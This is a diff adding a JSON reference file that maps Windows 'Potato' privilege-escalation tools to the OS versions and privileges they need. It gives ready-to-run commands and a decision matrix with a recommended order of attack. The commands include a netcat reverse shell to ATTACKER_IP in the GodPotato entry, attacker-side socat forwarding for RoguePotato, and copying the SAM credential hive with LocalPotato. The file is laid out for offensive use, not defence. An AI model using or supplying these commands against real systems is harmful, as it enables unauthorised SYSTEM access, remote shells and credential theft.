@@ -1,0 +1,258 @@
+{
+  "version": "1.0.0",
+  "description": "Windows Potato attacks compatibility matrix",
+  "attacks": {
+    "JuicyPotato": {
+      "description": "Abuse SeImpersonate/SeAssignPrimaryToken privileges via DCOM/BITS",
+      "aliases": ["RottenPotatoNG"],
+      "required_privileges": ["SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege"],
+      "os_compatibility": {
+        "Windows 7": true,
+        "Windows 8": true,
+        "Windows 8.1": true,
+        "Windows 10 (1809 and below)": true,
+        "Windows 10 (1903+)": false,
+        "Windows 11": false,
+        "Windows Server 2008": true,
+        "Windows Server 2008 R2": true,
+        "Windows Server 2012": true,
+        "Windows Server 2012 R2": true,
+        "Windows Server 2016": true,
+        "Windows Server 2019 (1809 and below)": true,
+        "Windows Server 2019 (1903+)": false,
+        "Windows Server 2022": false
+      },
+      "exploit_sources": [
+        "https://github.com/ohpe/juicy-potato"
+      ],
+      "commands": [
+        "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {CLSID}",
+        "JuicyPotato.exe -l 1337 -p c:\\shell.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}"
+      ],
+      "clsid_list": "https://github.com/ohpe/juicy-potato/tree/master/CLSID",
+      "notes": "Requires valid CLSID for target OS, patched in Windows 10 1903+"
+    },
+    "RoguePotato": {
+      "description": "Local/Remote potato leveraging OXID resolver",
+      "required_privileges": ["SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege"],
+      "os_compatibility": {
+        "Windows 7": true,
+        "Windows 8": true,
+        "Windows 8.1": true,
+        "Windows 10": true,
+        "Windows 11": true,
+        "Windows Server 2008": true,
+        "Windows Server 2008 R2": true,
+        "Windows Server 2012": true,
+        "Windows Server 2012 R2": true,
+        "Windows Server 2016": true,
+        "Windows Server 2019": true,
+        "Windows Server 2022": true
+      },
+      "requirements": ["Remote OXID resolver or local port forwarding"],
+      "exploit_sources": [
+        "https://github.com/antonioCoco/RoguePotato"
+      ],
+      "commands": [
+        "# On attacker: socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999",
+        "RoguePotato.exe -r ATTACKER_IP -e \"cmd.exe /c whoami > c:\\out.txt\" -l 9999"
+      ],
+      "notes": "Works on newer Windows versions where JuicyPotato is patched"
+    },
+    "PrintSpoofer": {
+      "description": "Abuse SeImpersonate via named pipe impersonation on Print Spooler",
+      "required_privileges": ["SeImpersonatePrivilege"],
+      "os_compatibility": {
+        "Windows 7": false,
+        "Windows 8": false,
+        "Windows 8.1": false,
+        "Windows 10": true,
+        "Windows 11": true,
+        "Windows Server 2008": false,
+        "Windows Server 2008 R2": false,
+        "Windows Server 2012": false,
+        "Windows Server 2012 R2": false,
+        "Windows Server 2016": true,
+        "Windows Server 2019": true,
+        "Windows Server 2022": true
+      },
+      "requirements": ["Print Spooler service running"],
+      "exploit_sources": [
+        "https://github.com/itm4n/PrintSpoofer"
+      ],
+      "commands": [
+        "PrintSpoofer.exe -i -c cmd",
+        "PrintSpoofer.exe -c \"c:\\windows\\system32\\cmd.exe /c whoami > c:\\out.txt\""
+      ],
+      "notes": "Simple and reliable on newer Windows versions"
+    },
+    "SweetPotato": {
+      "description": "Collection of potato techniques in one tool",
+      "required_privileges": ["SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege"],
+      "os_compatibility": {
+        "Windows 7": true,
+        "Windows 8": true,
+        "Windows 8.1": true,
+        "Windows 10": true,
+        "Windows 11": true,
+        "Windows Server 2008": true,
+        "Windows Server 2008 R2": true,
+        "Windows Server 2012": true,
+        "Windows Server 2012 R2": true,
+        "Windows Server 2016": true,
+        "Windows Server 2019": true,
+        "Windows Server 2022": true
+      },
+      "exploit_sources": [
+        "https://github.com/CCob/SweetPotato"
+      ],
+      "commands": [
+        "SweetPotato.exe -e EfsRpc -p c:\\windows\\system32\\cmd.exe",
+        "SweetPotato.exe -e PrintSpoofer -p cmd.exe"
+      ],
+      "notes": "Combines multiple techniques, auto-selects best method"
+    },
+    "GodPotato": {
+      "description": "Cross-version potato using RPC/DCOM calls",
+      "required_privileges": ["SeImpersonatePrivilege"],
+      "os_compatibility": {
+        "Windows 7": false,
+        "Windows 8": true,
+        "Windows 8.1": true,
+        "Windows 10": true,
+        "Windows 11": true,
+        "Windows Server 2008": false,
+        "Windows Server 2008 R2": false,
+        "Windows Server 2012": true,
+        "Windows Server 2012 R2": true,
+        "Windows Server 2016": true,
+        "Windows Server 2019": true,
+        "Windows Server 2022": true
+      },
+      "exploit_sources": [
+        "https://github.com/BeichenDream/GodPotato"
+      ],
+      "commands": [
+        "GodPotato.exe -cmd \"cmd /c whoami\"",
+        "GodPotato.exe -cmd \"nc.exe -e cmd.exe ATTACKER_IP 4444\""
+      ],
+      "notes": "Very reliable on modern Windows"
+    },
+    "SharpEfsPotato": {
+      "description": "EFS-based potato technique",
+      "required_privileges": ["SeImpersonatePrivilege"],
+      "os_compatibility": {
+        "Windows 7": false,
+        "Windows 8": false,
+        "Windows 8.1": false,
+        "Windows 10": true,
+        "Windows 11": true,
+        "Windows Server 2008": false,
+        "Windows Server 2008 R2": false,
+        "Windows Server 2012": false,
+        "Windows Server 2012 R2": false,
+        "Windows Server 2016": true,
+        "Windows Server 2019": true,
+        "Windows Server 2022": true
+      },
+      "requirements": ["EFS service available"],
+      "exploit_sources": [
+        "https://github.com/zcgonvh/EfsPotato"
+      ],
+      "commands": [
+        "SharpEfsPotato.exe -p c:\\windows\\system32\\cmd.exe"
+      ],
+      "notes": "Uses EFS RPC for token impersonation"
+    },
+    "CoercedPotato": {
+      "description": "Potato using various Windows coercion methods",
+      "required_privileges": ["SeImpersonatePrivilege"],
+      "os_compatibility": {
+        "Windows 10": true,
+        "Windows 11": true,
+        "Windows Server 2016": true,
+        "Windows Server 2019": true,
+        "Windows Server 2022": true
+      },
+      "exploit_sources": [
+        "https://github.com/Prepouce/CoercedPotato"
+      ],
+      "commands": [
+        "CoercedPotato.exe -e PrintSpoofer -p cmd.exe"
+      ],
+      "notes": "Multiple coercion methods available"
+    },
+    "LocalPotato": {
+      "description": "NTLM local relay to privileged service",
+      "aliases": [],
+      "required_privileges": [],
+      "os_compatibility": {
+        "Windows 10": true,
+        "Windows 11": true,
+        "Windows Server 2019": true,
+        "Windows Server 2022": true
+      },
+      "requirements": ["Low privilege user"],
+      "exploit_sources": [
+        "https://github.com/decoder-it/LocalPotato"
+      ],
+      "commands": [
+        "LocalPotato.exe -i c:\\windows\\system32\\config\\sam -o \\\\127.0.0.1\\c$\\temp\\sam"
+      ],
+      "notes": "Can read/write privileged files, does not require SeImpersonate"
+    },
+    "HotPotato": {
+      "description": "NBNS/WPAD NTLM relay",
+      "required_privileges": [],
+      "os_compatibility": {
+        "Windows 7": true,
+        "Windows 8": true,
+        "Windows 8.1": true,
+        "Windows 10 (pre-1809)": true,
+        "Windows 10 (1809+)": false,
+        "Windows Server 2008": true,
+        "Windows Server 2012": true,
+        "Windows Server 2016 (pre-1809)": true
+      },
+      "exploit_sources": [
+        "https://github.com/foxglovesec/Potato"
+      ],
+      "commands": [
+        "Potato.exe -ip ATTACKER_IP -cmd 'c:\\windows\\system32\\cmd.exe /c whoami > c:\\out.txt' -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true"
+      ],
+      "notes": "Original potato technique, patched in later Windows versions"
+    }
+  },
+  "privilege_check": {
+    "commands": [
+      "whoami /priv",
+      "whoami /all"
+    ],
+    "key_privileges": {
+      "SeImpersonatePrivilege": {
+        "description": "Impersonate a client after authentication",
+        "common_accounts": ["IIS AppPool", "SQL Server", "Service accounts"],
+        "potatoes": ["JuicyPotato", "PrintSpoofer", "GodPotato", "SweetPotato", "RoguePotato"]
+      },
+      "SeAssignPrimaryTokenPrivilege": {
+        "description": "Replace a process level token",
+        "common_accounts": ["Service accounts"],
+        "potatoes": ["JuicyPotato", "RoguePotato"]
+      }
+    }
+  },
+  "decision_matrix": {
+    "description": "Quick selection guide based on OS and privileges",
+    "windows_10_1903_plus": ["PrintSpoofer", "GodPotato", "SweetPotato", "RoguePotato"],
+    "windows_10_1809_below": ["JuicyPotato", "PrintSpoofer", "GodPotato", "SweetPotato"],
+    "windows_server_2019_plus": ["PrintSpoofer", "GodPotato", "SweetPotato", "RoguePotato"],
+    "windows_server_2016_below": ["JuicyPotato", "SweetPotato"],
+    "no_seimpersonate": ["LocalPotato"],
+    "recommended_order": ["PrintSpoofer", "GodPotato", "SweetPotato", "JuicyPotato", "RoguePotato"]
+  },
+  "metadata": {
+    "total_techniques": 9,
+    "last_updated": "2024",
+    "note": "Always verify OS version and required privileges before attempting"
+  }
+}
